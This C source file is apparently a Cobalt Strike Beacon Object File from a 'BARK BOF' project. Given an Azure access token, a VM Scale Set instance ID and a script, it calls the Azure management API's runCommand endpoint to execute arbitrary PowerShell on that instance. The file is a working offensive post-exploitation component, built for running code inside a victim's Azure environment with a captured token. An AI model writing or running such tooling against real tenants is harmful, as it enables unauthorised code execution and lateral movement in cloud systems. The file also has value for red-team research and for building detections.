/*
 * invoke_azure_vm_scaleset_run_command.c — BARK BOF
 * Invoke-AzureVMScaleSetVMRunCommand — Run a command on a VM Scale Set instance
 *
 * Args : token, vmssVmId, script
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[1024];
    static char bodyBuf[8192];
    LPWSTR widePath = NULL;
    char  *token = NULL, *vmssVmId = NULL, *script = NULL;

    BeaconDataParse(&parser, args, alen);
    token    = BeaconDataExtract(&parser, NULL);
    vmssVmId = BeaconDataExtract(&parser, NULL);
    script   = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_invoke_azure_vm_scaleset_run_command "
            "<token> <vmssVmId> <script>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"commandId\":\"RunPowerShellScript\",\"script\":[\"%s\"]}", script);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/runCommand?api-version=2018-04-01", vmssVmId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Invoke-AzureVMScaleSetVMRunCommand\n");
    BarkPost(L"management.azure.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
